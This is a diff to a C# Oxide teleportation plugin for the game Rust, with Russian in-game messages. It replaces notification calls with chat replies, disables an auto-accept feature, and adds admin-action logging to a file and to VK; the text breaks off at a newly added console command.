             if (tpQueue.Any(p => p.Player == player) || pendings.Any(p => p.Player2 == player))
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["tpError"]);
+                SendReply(player, Messages["tpError"]);
                 return;
             }
 
             if (tpQueue.Any(p => p.Player == target) || pendings.Any(p => p.Player2 == target))
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["tpError"]);
+                SendReply(player, Messages["tpError"]);
                 return;
             }
-            SendNotify(player, string.Format(Messages["tprrequestsuccess"], target.displayName));
-            SendNotify(target, string.Format(Messages["tprpending"], player.displayName));
+            NoteUI?.Call("DrawInfoNote", player, $"Вы отправили запрос на ТП игроку - {target.displayName}");
+            NoteUI?.Call("DrawInfoNote", target, $"Вам пришёл запрос на ТП от игрока - {player.displayName}");
+            SendReply(player, string.Format(Messages["tprrequestsuccess"], target.displayName));
+            SendReply(target, string.Format(Messages["tprpending"], player.displayName));
             Effect.server.Run(EffectPrefab1, target, 0, Vector3.zero, Vector3.forward);
 
 
             pendings.Add(new TP(target, Vector3.zero, 15, false, false, player));
-            if (AutoTPA.ContainsKey(target.userID))
+            /*if (AutoTPA.ContainsKey(target.userID))
             {
                 var key = AutoTPA[target.userID].PlayersList.FirstOrDefault(p => p.Value == player.userID).Key;
                 if (AutoTPA[target.userID].Enabled && !string.IsNullOrEmpty(key))
                 {
                     target.Command("tp.cmd tpa");
-                    SendNotify(target, Messages["TPASuccess"]);
+                    SendReply(target, Messages["TPASuccess"]);
                     return;
 
                 }
-            }
+            }*/
         }
         [ChatCommand("tpa")]
         void cmdChatTpa(BasePlayer player, string command, string[] args)
@@ -1133,65 +1062,65 @@ namespace Oxide.Plugins
             if (tp == null)
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["tpanotexist"]);
+                SendReply(player, Messages["tpanotexist"]);
                 return;
             }
             BasePlayer pendingPlayer = tp.Player2;
             if (pendingPlayer == null)
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["tpanotexist"]);
+                SendReply(player, Messages["tpanotexist"]);
                 return;
             }
             if (!EnabledBallonTP && player.GetParentEntity() is HotAirBalloon)
             {
-                SendNotify(player, Messages["PlayerIsOnHotAirBalloon"]);
+                SendReply(player, Messages["PlayerIsOnHotAirBalloon"]);
                 return;
             }
             if (!EnabledShipTP && player.GetParentEntity() is CargoShip)
             {
-                SendNotify(player, Messages["PlayerIsOnCargoShip"]);
+                SendReply(player, Messages["PlayerIsOnCargoShip"]);
                 return;
             }
             if (CancelTPCold && player.metabolism.temperature.value < 0)
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["coldplayer"]);
+                SendReply(player, Messages["coldplayer"]);
                 return;
             }
             if (player.IsWounded() && CancelTPWounded)
             {
-                SendNotify(player, Messages["woundedAction"]);
+                SendReply(player, Messages["woundedAction"]);
                 return;
             }
             if (player.metabolism.bleeding.value > 0 && CancelTPMetabolism)
             {
-                SendNotify(player, Messages["woundedAction"]);
+                SendReply(player, Messages["woundedAction"]);
                 return;
             }
             if (CancelTPRadiation && player.radiationLevel > 10)
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["Radiation"]);
+                SendReply(player, Messages["Radiation"]);
                 return;
             }
             if (restrictCupboard && player.GetBuildingPrivilege(player.WorldSpaceBounds()) != null && !player.GetBuildingPrivilege(player.WorldSpaceBounds()).authorizedPlayers.Select(p => p.userid).Contains(player.userID))
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["tpacupboard"]);
+                SendReply(player, Messages["tpacupboard"]);
                 return;
             }
             var ret = Interface.Call("CanTeleport", player) as string;
             if (ret != null)
             {
-                SendNotify(player, ret);
+                SendReply(player, ret);
                 return;
             }
             if (FriendsEnabled)
                 if (!IsFriends(pendingPlayer.userID, player.userID) && !IsTeamate(player, pendingPlayer.userID) && !IsClanMember(player.userID, pendingPlayer.userID))
                 {
                     Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                    SendNotify(player, Messages["PlayerNotFriend"]);
+                    SendReply(player, Messages["PlayerNotFriend"]);
                     return;
                 }
             var time = GetTeleportTime(pendingPlayer.userID);
@@ -1205,8 +1134,8 @@ namespace Oxide.Plugins
             tpQueue.Add(new TP(pendingPlayer, player.transform.position, time, Enabled, false, player));
             Effect.server.Run(EffectPrefab1, player, 0, Vector3.zero, Vector3.forward);
             CuiHelper.DestroyUi(player, "teleportmenu");
-            SendNotify(pendingPlayer, string.Format(Messages["tpqueue"], player.displayName, TimeToString(time)));
-            if (args.Length <= 0) SendNotify(player, string.Format(Messages["tpasuccess"], pendingPlayer.displayName, TimeToString(time)));
+            SendReply(pendingPlayer, string.Format(Messages["tpqueue"], player.displayName, TimeToString(time)));
+            if (args.Length <= 0) SendReply(player, String.Format(Messages["tpasuccess"], pendingPlayer.displayName, TimeToString(time)));
         }
         [ChatCommand("tpc")]
         void cmdChatTpc(BasePlayer player, string command, string[] args)
@@ -1216,38 +1145,38 @@ namespace Oxide.Plugins
             if (target != null)
             {
                 pendings.Remove(tp);
-                SendNotify(player, Messages["tpc"]);
-                SendNotify(target, string.Format(Messages["tpctarget"], player.displayName));
+                SendReply(player, Messages["tpc"]);
+                SendReply(target, string.Format(Messages["tpctarget"], player.displayName));
                 return;
             }
             if (player.IsWounded() && CancelTPWounded)
             {
-                SendNotify(player, Messages["woundedAction"]);
+                SendReply(player, Messages["woundedAction"]);
                 return;
             }
             if (player.metabolism.bleeding.value > 0 && CancelTPMetabolism)
             {
-                SendNotify(player, Messages["woundedAction"]);
+                SendReply(player, Messages["woundedAction"]);
                 return;
             }
             if (CancelTPRadiation && player.radiationLevel > 10)
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["Radiation"]);
+                SendReply(player, Messages["Radiation"]);
                 return;
             }
             if (CancelTPCold && player.metabolism.temperature.value < 0)
             {
-                SendNotify(player, Messages["coldplayer"]);
+                SendReply(player, Messages["coldplayer"]);
                 return;
             }
             foreach (var pend in pendings)
             {
                 if (pend.Player2 == player)
                 {
-                    SendNotify(player, Messages["tpc"]);
-                    SendNotify(pend.Player, string.Format(Messages["tpctarget"], player.displayName));
-
+                    SendReply(player, Messages["tpc"]);
+                    SendReply(pend.Player, string.Format(Messages["tpctarget"], player.displayName));
+                    
                     CuiHelper.DestroyUi(player, "teleportmenu");
                     pendings.Remove(pend);
                     return;
@@ -1258,16 +1187,16 @@ namespace Oxide.Plugins
                 if (tpQ.Player2 != null && tpQ.Player2 == player)
                 {
                     CuiHelper.DestroyUi(player, "teleportmenu");
-                    SendNotify(player, Messages["tpc"]);
-                    SendNotify(tpQ.Player, string.Format(Messages["tpctarget"], player.displayName));
+                    SendReply(player, Messages["tpc"]);
+                    SendReply(tpQ.Player, string.Format(Messages["tpctarget"], player.displayName));
                     tpQueue.Remove(tpQ);
                     return;
                 }
                 if (tpQ.Player == player)
                 {
                     CuiHelper.DestroyUi(player, "teleportmenu");
-                    SendNotify(player, Messages["tpc"]);
-                    if (tpQ.Player2 != null) SendNotify(tpQ.Player2, string.Format(Messages["tpctarget"], player.displayName));
+                    SendReply(player, Messages["tpc"]);
+                    if (tpQ.Player2 != null) SendReply(tpQ.Player2, string.Format(Messages["tpctarget"], player.displayName));
                     tpQueue.Remove(tpQ);
                     return;
                 }
@@ -1306,7 +1235,7 @@ namespace Oxide.Plugins
             catch { }
             player.SendFullSnapshot();
 
-            SendNotify(player, "Слежка закончена!");
+            SendReply(player, "Слежка закончена!");
         }
 
 
@@ -1337,7 +1266,7 @@ namespace Oxide.Plugins
             if (args == null || args.Length == 0)
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["tpArgsError"]);
+                SendReply(player, Messages["tpArgsError"]);
                 return;
             }
             switch (args[0])
@@ -1346,7 +1275,7 @@ namespace Oxide.Plugins
                     if (tpsave.Count <= 0)
                     {
                         Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                        SendNotify(player, Messages["homesmissing"]);
+                        SendReply(player, Messages["homesmissing"]);
                         return;
                     }
                     var nametp = args[0];
@@ -1354,21 +1283,21 @@ namespace Oxide.Plugins
                     if (tp == null)
                     {
                         Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                        SendNotify(player, Messages["homenotexist"]);
+                        SendReply(player, Messages["homenotexist"]);
                         return;
                     }
                     var position = tp.pos;
                     var ret = Interface.Call("CanTeleport", player) as string;
                     if (ret != null)
                     {
-                        SendNotify(player, ret);
+                        SendReply(player, ret);
                         return;
                     }
                     int seconds;
                     if (cooldownsHOME.TryGetValue(player.userID, out seconds) && seconds > 0)
                     {
                         Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                        SendNotify(player, string.Format(Messages["tpkd"], TimeToString(seconds)));
+                        SendReply(player, string.Format(Messages["tpkd"], TimeToString(seconds)));
                         return;
                     }
                     var lastTp = tpQueue.Find(p => p.Player == player);
@@ -1378,7 +1307,7 @@ namespace Oxide.Plugins
                     else
                     {
                         tpQueue.Add(new TP(player, position, TplPedingTime, false, true));
-                        SendNotify(player, string.Format(Messages["homequeue"], nametp, TimeToString(TplPedingTime)));
+                        SendReply(player, String.Format(Messages["homequeue"], nametp, TimeToString(TplPedingTime)));
                     }
                     return;
                 case "add":
@@ -1386,7 +1315,7 @@ namespace Oxide.Plugins
                     if (args == null || args.Length == 1)
                     {
                         Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                        SendNotify(player, Messages["settpArgsError"]);
+                        SendReply(player, Messages["settpArgsError"]);
                         return;
                     }
                     var nameAdd = args[1];
@@ -1397,7 +1326,7 @@ namespace Oxide.Plugins
                     if (args == null || args.Length == 1)
                     {
                         Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                        SendNotify(player, Messages["removetpArgsError"]);
+                        SendReply(player, Messages["removetpArgsError"]);
                         return;
                     }
                     nametp = args[1];
@@ -1407,23 +1336,23 @@ namespace Oxide.Plugins
                         if (tp == null)
                         {
                             Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                            SendNotify(player, Messages["homesmissing"]);
+                            SendReply(player, Messages["homesmissing"]);
                             return;
                         }
                         Effect.server.Run(EffectPrefab1, player, 0, Vector3.zero, Vector3.forward);
                         tpsave.Remove(tp);
-                        SendNotify(player, string.Format(Messages["removehomesuccess"], nametp));
+                        SendReply(player, Messages["removehomesuccess"], nametp);
                     }
                     return;
                 case "list":
                     if (tpsave.Count <= 0)
                     {
                         Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                        SendNotify(player, Messages["TPLmissing"]);
+                        SendReply(player, Messages["TPLmissing"]);
                         return;
                     }
                     var tplist = tpsave.Select(x => $"{x.Name} {x.pos}");
-                    SendNotify(player, string.Format(Messages["TPLList"], string.Join("\n", tplist.ToArray())));
+                    SendReply(player, Messages["TPLList"], string.Join("\n", tplist.ToArray()));
                     return;
             }
         }
@@ -1435,7 +1364,7 @@ namespace Oxide.Plugins
             {
                 if (args.Length == 0 || args.Length != 1)
                 {
-                    SendNotify(player, Messages["tpspecError"]);
+                    SendReply(player, Messages["tpspecError"]);
                     return;
                 }
                 string name = args[0];
@@ -1443,7 +1372,7 @@ namespace Oxide.Plugins
                 if (target == null)
                 {
                     Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                    SendNotify(player, Messages["playermissing"]);
+                    SendReply(player, Messages["playermissing"]);
                     return;
                 }
                 switch (args.Length)
@@ -1451,22 +1380,22 @@ namespace Oxide.Plugins
                     case 1:
                         if (!target.IsConnected)
                         {
-                            SendNotify(player, Messages["playermissingOff"]);
+                            SendReply(player, Messages["playermissingOff"]);
                             return;
                         }
                         if (target.IsDead())
                         {
-                            SendNotify(player, Messages["playermissingOrDeath"]);
+                            SendReply(player, Messages["playermissingOrDeath"]);
                             return;
                         }
                         if (ReferenceEquals(target, player))
                         {
-                            SendNotify(player, Messages["playerItsYou"]);
+                            SendReply(player, Messages["playerItsYou"]);
                             return;
                         }
                         if (target.IsSpectating())
                         {
-                            SendNotify(player, Messages["playerItsSpec"]);
+                            SendReply(player, Messages["playerItsSpec"]);
                             return;
                         }
                         spectatingPlayers.Remove(target);
@@ -1483,7 +1412,7 @@ namespace Oxide.Plugins
                         player.SetParent(target);
                         player.SetPlayerFlag(BasePlayer.PlayerFlags.ThirdPersonViewmode, true);
                         player.Command("camoffset", "0, 1.3, 0");
-                        SendNotify(player, $"Вы наблюдаете за игроком {target}! Что бы переключаться между игроками, нажимайте: Пробел\nЧтобы выйти с режима наблюдения, введите: /tpspec");
+                        SendReply(player, $"Вы наблюдаете за игроком {target}! Что бы переключаться между игроками, нажимайте: Пробел\nЧтобы выйти с режима наблюдения, введите: /tpspec");
                         break;
                 }
             }
@@ -1501,8 +1430,13 @@ namespace Oxide.Plugins
                     if (target == null)
                     {
                         Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                        SendNotify(player, Messages["playermissing"]);
+                        SendReply(player, Messages["playermissing"]);
                         return;
+                    }
+                    if (adminsLogs)
+                    {
+                        SendVKLogs($"[{DateTime.Now.ToShortTimeString()}] {player.displayName} ({player.userID}) телепортировался к {target.displayName} ({target.userID})");
+                        LogToFile("admin", $"[{DateTime.Now.ToShortTimeString()}] {player} телепортировался к {target}", this, true);
                     }
                     Teleport(player, target);
                     break;
@@ -1513,8 +1447,13 @@ namespace Oxide.Plugins
                     BasePlayer target2 = FindBasePlayer(name2);
                     if (target1 == null || target2 == null)
                     {
-                        SendNotify(player, Messages["playermissing"]);
+                        SendReply(player, Messages["playermissing"]);
                         return;
+                    }
+                    if (adminsLogs)
+                    {
+                        SendVKLogs($"[{DateTime.Now.ToShortTimeString()}] {player.displayName} ({player.userID}) телепортировал {target1.displayName} ({target1.userID}) к {target2.displayName} ({target2.userID})");
+                        LogToFile("admin", $"[{DateTime.Now.ToShortTimeString()}] Игрок {player} телепортировал {target1} к {target2}", this, true);
                     }
                     Teleport(target1, target2);
                     break;
@@ -1522,6 +1461,11 @@ namespace Oxide.Plugins
                     float x = float.Parse(args[0].Replace(",", ""));
                     float y = float.Parse(args[1].Replace(",", ""));
                     float z = float.Parse(args[2]);
+                    if (adminsLogs)
+                    {
+                        SendVKLogs($"[{DateTime.Now.ToShortTimeString()}] {player.displayName} ({player.userID}) телепортировался на координаты: ({x} / {y} / {z})");
+                        LogToFile("admin", $"[{DateTime.Now.ToShortTimeString()}] Игрок {player} телепортировался на координаты: ({x} / {y} / {z})", this, true);
+                    }
                     Teleport(player, x, y, z);
                     break;
             }
@@ -1553,7 +1497,7 @@ namespace Oxide.Plugins
             pendings.RemoveAll(p => p.Player == player || p.Player2 == player);
             tpQueue.RemoveAll(p => p.Player == player || p.Player2 == player);
         }
-
+        
         void OnServerInitialized()
         {
             LoadData();
@@ -1563,19 +1507,13 @@ namespace Oxide.Plugins
             timer.Every(1f, TeleportationTimerHandle);
             timer.Every(300, SaveData);
 
-            if (500 > 0)
+            /*foreach (var player in BasePlayer.activePlayerList.ToList())
             {
-                timer.Every(500, () => { friends.Clear(); });
-            }
-
-            foreach (var player in BasePlayer.activePlayerList.ToList())
-            {
-                var friendList = GetFriends(player.userID);
-                if (friendList.Count > 0)
+                timer.Every(1f, () => 
                 {
                     AddPlayerAutoTP(player);
-                }
-            }
+                });
+            }*/
         }
         void Unload() => SaveData();
         void OnEntityBuilt(Planner planner, GameObject gameobject)
@@ -1592,13 +1530,13 @@ namespace Oxide.Plugins
                     if (Vector3.Distance(pending.pos, pos) < 3)
                     {
                         entity.Kill();
-                        SendNotify(planner.GetOwnerPlayer(), "Нельзя, тут телепортируется игрок!");
+                        SendReply(planner.GetOwnerPlayer(), "Нельзя, тут телепортируется игрок!");
                         return;
                     }
                 }
             }
         }
-        [PluginReference] Plugin Duel, Notify;
+        [PluginReference] Plugin Duel, NoteUI;
         bool InDuel(BasePlayer player) => Duel?.Call<bool>("IsPlayerOnActiveDuel", player) ?? false;
         void TeleportationTimerHandle()
         {
@@ -1625,17 +1563,17 @@ namespace Oxide.Plugins
                 if (pend.Player != null && pend.Player.IsConnected && pend.Player.IsWounded())
                 {
                     CuiHelper.DestroyUi(pend.Player, "teleportmenu");
-                    SendNotify(pend.Player, Messages["tpwounded"]);
+                    SendReply(pend.Player, Messages["tpwounded"]);
                     pendings.RemoveAt(i);
                     continue;
                 }
                 if (--pend.seconds <= 0)
                 {
                     pendings.RemoveAt(i);
-
+                    
                     CuiHelper.DestroyUi(pend.Player, "teleportmenu");
-                    if (pend.Player2 != null && pend.Player2.IsConnected) SendNotify(pend.Player2, Messages["tppendingcanceled"]);
-                    if (pend.Player != null && pend.Player.IsConnected) SendNotify(pend.Player, Messages["tpacanceled"]);
+                    if (pend.Player2 != null && pend.Player2.IsConnected) SendReply(pend.Player2, Messages["tppendingcanceled"]);
+                    if (pend.Player != null && pend.Player.IsConnected) SendReply(pend.Player, Messages["tpacanceled"]);
                 }
             }
             for (int i = tpQueue.Count - 1;
@@ -1649,15 +1587,15 @@ namespace Oxide.Plugins
                 {
                     if (tp.Player.IsConnected && (CancelTPWounded && tp.Player.IsWounded()) || (tp.Player.metabolism.bleeding.value > 0 && CancelTPMetabolism) || (CancelTPRadiation && tp.Player.radiationLevel > 10))
                     {
-                        SendNotify(tp.Player, Messages["tpwounded"]);
-                        if (tp.Player2 != null && tp.Player2.IsConnected) SendNotify(tp.Player2, Messages["tpWoundedTarget"]);
+                        SendReply(tp.Player, Messages["tpwounded"]);
+                        if (tp.Player2 != null && tp.Player2.IsConnected) SendReply(tp.Player2, Messages["tpWoundedTarget"]);
                         tpQueue.RemoveAt(i);
                         continue;
                     }
                     if (InDuel(tp.Player))
                     {
-                        SendNotify(tp.Player, Messages["InDuel"]);
-                        if (tp.Player2 != null && tp.Player2.IsConnected) SendNotify(tp.Player2, Messages["InDuelTarget"]);
+                        SendReply(tp.Player, Messages["InDuel"]);
+                        if (tp.Player2 != null && tp.Player2.IsConnected) SendReply(tp.Player2, Messages["InDuelTarget"]);
                         tpQueue.RemoveAt(i);
                         continue;
                     }
@@ -1668,8 +1606,8 @@ namespace Oxide.Plugins
                         {
                             Effect.server.Run(EffectPrefab, tp.Player, 0, Vector3.zero, Vector3.forward);
 
-                            SendNotify(tp.Player, Messages["tpcupboard"]);
-                            if (tp.Player2 != null && tp.Player2.IsConnected) SendNotify(tp.Player2, Messages["tpcupboardTarget"]);
+                            SendReply(tp.Player, Messages["tpcupboard"]);
+                            if (tp.Player2 != null && tp.Player2.IsConnected) SendReply(tp.Player2, Messages["tpcupboardTarget"]);
                             tpQueue.RemoveAt(i);
                             return;
                         }
@@ -1680,15 +1618,15 @@ namespace Oxide.Plugins
                 {
                     if (tp.Player2.IsConnected && (tp.Player2.IsWounded() && CancelTPWounded) || (tp.Player2.metabolism.bleeding.value > 0 && CancelTPMetabolism) || (CancelTPRadiation && tp.Player2.radiationLevel > 10))
                     {
-                        SendNotify(tp.Player2, Messages["tpwounded"]);
-                        if (tp.Player != null && tp.Player.IsConnected) SendNotify(tp.Player, Messages["tpWoundedTarget"]);
+                        SendReply(tp.Player2, Messages["tpwounded"]);
+                        if (tp.Player != null && tp.Player.IsConnected) SendReply(tp.Player, Messages["tpWoundedTarget"]);
                         tpQueue.RemoveAt(i);
                         continue;
                     }
                     if (InDuel(tp.Player2))
                     {
-                        SendNotify(tp.Player2, Messages["InDuel"]);
-                        if (tp.Player != null && tp.Player.IsConnected) SendNotify(tp.Player, Messages["InDuelTarget"]);
+                        SendReply(tp.Player2, Messages["InDuel"]);
+                        if (tp.Player != null && tp.Player.IsConnected) SendReply(tp.Player, Messages["InDuelTarget"]);
                         tpQueue.RemoveAt(i);
                         continue;
                     }
@@ -1698,9 +1636,9 @@ namespace Oxide.Plugins
                         if (privilege != null && !tp.Player2.IsBuildingAuthed())
                         {
                             Effect.server.Run(EffectPrefab, tp.Player2, 0, Vector3.zero, Vector3.forward);
-                            if (tp.Player != null && tp.Player.IsConnected) SendNotify(tp.Player, Messages["tpcupboardTarget"]);
+                            if (tp.Player != null && tp.Player.IsConnected) SendReply(tp.Player, Messages["tpcupboardTarget"]);
 
-                            SendNotify(tp.Player2, Messages["tpcupboard"]);
+                            SendReply(tp.Player2, Messages["tpcupboard"]);
                             return;
                         }
                     }
@@ -1711,12 +1649,12 @@ namespace Oxide.Plugins
                     var ret = Interface.CallHook("CanTeleport", tp.Player) as string;
                     if (ret != null)
                     {
-                        SendNotify(tp.Player, ret);
+                        SendReply(tp.Player, ret);
                         continue;
                     }
                     if (CheckInsideInFoundation(tp.pos))
                     {
-                        SendNotify(tp.Player, Messages["InsideInFoundationTP"]);
+                        SendReply(tp.Player, Messages["InsideInFoundationTP"]);
                         continue;
                     }
                     if (tp.Player2 != null)
@@ -1728,7 +1666,7 @@ namespace Oxide.Plugins
                     {
                         var seconds = GetKD(tp.Player.userID);
                         cooldownsTP[tp.Player.userID] = seconds;
-                        SendNotify(tp.Player, string.Format(Messages["tpplayersuccess"], tp.Player2.displayName));
+                        SendReply(tp.Player, string.Format(Messages["tpplayersuccess"], tp.Player2.displayName));
                     }
                     else if (tp.Player != null && tp.Player.IsConnected)
                     {
@@ -1737,13 +1675,13 @@ namespace Oxide.Plugins
                         {
                             var seconds = TPLCooldown;
                             cooldownsHOME[tp.Player.userID] = seconds;
-                            SendNotify(tp.Player, Messages["tplsuccess"]);
+                            SendReply(tp.Player, Messages["tplsuccess"]);
                         }
                         else
                         {
                             var seconds = GetKDHome(tp.Player.userID);
                             cooldownsHOME[tp.Player.userID] = seconds;
-                            SendNotify(tp.Player, Messages["tphomesuccess"]);
+                            SendReply(tp.Player, Messages["tphomesuccess"]);
                         }
                     }
                     Teleport(tp.Player, tp.pos);
@@ -1760,7 +1698,7 @@ namespace Oxide.Plugins
                 if (tp != null)
                 {
                     Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                    SendNotify(player, Messages["homeexist"]);
+                    SendReply(player, Messages["homeexist"]);
                     return;
                 }
             }
@@ -1771,7 +1709,7 @@ namespace Oxide.Plugins
             }
             );
             Effect.server.Run(EffectPrefab1, player, 0, Vector3.zero, Vector3.forward);
-            SendNotify(player, string.Format(Messages["homesucces"], name));
+            SendReply(player, Messages["homesucces"], name);
             timer.Once(10f, () => sethomeBlock.Remove(player.userID));
         }
         void SetHome(BasePlayer player, string name)
@@ -1781,7 +1719,7 @@ namespace Oxide.Plugins
             if (player.GetBuildingPrivilege(player.WorldSpaceBounds()) != null && !player.GetBuildingPrivilege(player.WorldSpaceBounds()).authorizedPlayers.Select(p => p.userid).Contains(player.userID))
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["sethomecupboard"]);
+                SendReply(player, Messages["sethomecupboard"]);
                 return;
             }
             Dictionary<string, Vector3> playerHomes;
@@ -1789,18 +1727,18 @@ namespace Oxide.Plugins
             if (GetHomeLimit(uid) == playerHomes.Count)
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["maxhomes"]);
+                SendReply(player, Messages["maxhomes"]);
                 return;
             }
             if (playerHomes.ContainsKey(name))
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["homeexist"]);
+                SendReply(player, Messages["homeexist"]);
                 return;
             }
             if (CheckInsideInFoundation(player.transform.position))
             {
-                SendNotify(player, Messages["InsideInFoundation"]);
+                SendReply(player, Messages["InsideInFoundation"]);
                 return;
             }
             playerHomes.Add(name, pos);
@@ -1809,7 +1747,7 @@ namespace Oxide.Plugins
                 CreateSleepingBag(player, pos, name);
             }
             Effect.server.Run(EffectPrefab1, player, 0, Vector3.zero, Vector3.forward);
-            SendNotify(player, string.Format(Messages["homesucces"], name));
+            SendReply(player, Messages["homesucces"], name);
             sethomeBlock.Add(player.userID);
             timer.Once(10f, () => sethomeBlock.Remove(player.userID));
         }
@@ -1905,7 +1843,7 @@ namespace Oxide.Plugins
             var ret = Interface.Call("CanTeleport", player) as string;
             if (ret != null)
             {
-                SendNotify(player, ret);
+                SendReply(player, ret);
                 return;
             }
             BaseMountable mount = player.GetMounted();
@@ -1927,13 +1865,13 @@ namespace Oxide.Plugins
         }
         DynamicConfigFile homesFile = Interface.Oxide.DataFileSystem.GetFile("Teleportation/Homes");
         DynamicConfigFile tpsaveFile = Interface.Oxide.DataFileSystem.GetFile("Teleportation/AdminTpSave");
-        public Dictionary<ulong, AutoTPASettings> AutoTPA = new Dictionary<ulong, AutoTPASettings>();
+        //public Dictionary<ulong, AutoTPASettings> AutoTPA = new Dictionary<ulong, AutoTPASettings>();
 
-        public class AutoTPASettings
+        /*public class AutoTPASettings
         {
             public bool Enabled;
             public Dictionary<string, ulong> PlayersList = new Dictionary<string, ulong>();
-        }
+        }*/
 
 
         void LoadData()
@@ -1952,24 +1890,24 @@ namespace Oxide.Plugins
                     PrintError("File Homes is null! Create new data files");
                     homes = new Dictionary<ulong, Dictionary<string, Vector3>>();
                 }
-                AutoTPA = Interface.GetMod().DataFileSystem.ReadObject<Dictionary<ulong, AutoTPASettings>>($"Teleportation/AutoTPA");
+                //AutoTPA = Interface.GetMod().DataFileSystem.ReadObject<Dictionary<ulong, AutoTPASettings>>($"Teleportation/AutoTPA");
 
             }
             catch
             {
                 tpsave = new List<TPList>();
                 homes = new Dictionary<ulong, Dictionary<string, Vector3>>();
-                AutoTPA = new Dictionary<ulong, AutoTPASettings>();
+                //AutoTPA = new Dictionary<ulong, AutoTPASettings>();
             }
         }
         void SaveData()
         {
             if (tpsave != null) tpsaveFile.WriteObject(tpsave);
             if (homes != null) homesFile.WriteObject(homes);
-            if (AutoTPA != null) Interface.Oxide.DataFileSystem.WriteObject($"Teleportation/AutoTPA", AutoTPA);
+            //if (AutoTPA != null) Interface.Oxide.DataFileSystem.WriteObject($"Teleportation/AutoTPA", AutoTPA);
 
         }
-
+        
         private string URLEncode(string input)
         {
             if (input.Contains("#")) input = input.Replace("#", "%23");
@@ -1983,86 +1921,383 @@ namespace Oxide.Plugins
             return input;
         }
 
-        Dictionary<string, string> Messages = new Dictionary<string, string>()
+        [ConsoleCommand("testvk1323")]
+        void testvk1323(ConsoleSystem.Arg args)
         {
-            {"foundationmissing", "Фундамент не найден!"},
-            {"InDuel", "Вы на Дуэли. Телепорт запрещен!"},
-            {"InDuelTarget", "Игрок на Дуэли. Телепорт запрещен!"},
-            {"foundationmissingR", "Фундамент не найден, местоположение было удалено!"},
-            {"playerisyou", "Нельзя отправлять телепорт самому себе!"},
-            {"maxhomes", "У вас максимальное кол-во местоположений!"},
-            {"homeexist", "Такое местоположение уже существует!"},
-            {"homesucces", "Местоположение {0} успешно установлено!"},
-            {"sethomeArgsError", "Для установки местоположения используйте /sethome ИМЯ"},
-            {"settpArgsError", "Для установки местоположения используйте /tpl add ИМЯ"},
-            {"homeArgsError", "Для телепортации на местоположение используйте /home ИМЯ"},
-            {"tpArgsError", "Для телепортации на местоположение используйте /tpl ИМЯ"},
-            {"tpError", "Запрещено! Вы в очереди на телепортацию"},
-            {"homenotexist", "Местоположение с таким названием не найдено!"},
-            {"homequeue", "Телепортация на {0} будет через {1}"},
-            {"tpwounded", "Вы получили ранение! Телепортация отменена!"},
-            {"tphomesuccess", "Вы телепортированы домой!"},
-            {"tplsuccess", "Вы успешно телепортированы!"},
-            {"tptpsuccess", "Вы телепортированы на указаное место!"},
-            {"homesmissing", "У вас нет доступных местоположений!"},
-            {"TPLmissing", "Для вас нет доступных местоположений!"},
-            {"TPLList", "Доступные точки местоположения:\n{0}"},
-            {"removehomeArgsError", "Для удаления местоположения используйте /removehome ИМЯ"},
-            {"removetpArgsError", "Для удаления местоположения используйте /tpl remove ИМЯ"},
-            {"removehomesuccess", "Местоположение {0} успешно удалено"},
-            {"sleepingbagmissing", "Спальный мешок не найден, местоположение удалено!"},
-            {"tprArgsError", "Для отправки запроса на телепортация используйте /tpr НИК"},
-            {"playermissing", "Игрок не найден"},
-            {"PlayerNotFriend", "Игрок не являеться Вашим другом! Телепорт запрещен!"},
-            {"tpspecError", "Не правильно введена команда. Используйте: /tpspec НИК"},
-            {"playermissingOff", "Игрок не в сети"},
-            {"playermissingOrDeath", "Игрок не найден, или он мёртв"},
-            {"playerItsYou", "Нельзя следить за самым собой"},
-            {" playerItsSpec", "Игрок уже за кем то наблюдает"},
-            {"tprrequestsuccess", "Запрос {0} успешно отправлен"},
-            {"tprpending", "{0} отправил вам запрос на телепортацию\nЧтобы принять используйте /tpa\nЧтобы отказаться используйте /tpc"},
-            {"tpanotexist", "У вас нет активных запросов на телепортацию!"},
-            {"tpqueue", "{0} принял ваш запрос на телепортацию\nВы будете телепортированы через {1}"},
-            {"tpc", "Телепортация успешно отменена!"}, 
-            {"tpctarget", "{0} отменил телепортацию!"},
-            {"tpplayersuccess", "Вы успешно телепортировались к {0}"},
-            {"tpasuccess", "Вы приняли запрос телепортации от {0}\nОн будет телепортирован через {1}"},
-            {"tppendingcanceled", "Запрос телепортации отменён"},
-            {"tpcupboard", "Телепортация в зоне действия чужого шкафа запрещена!"},
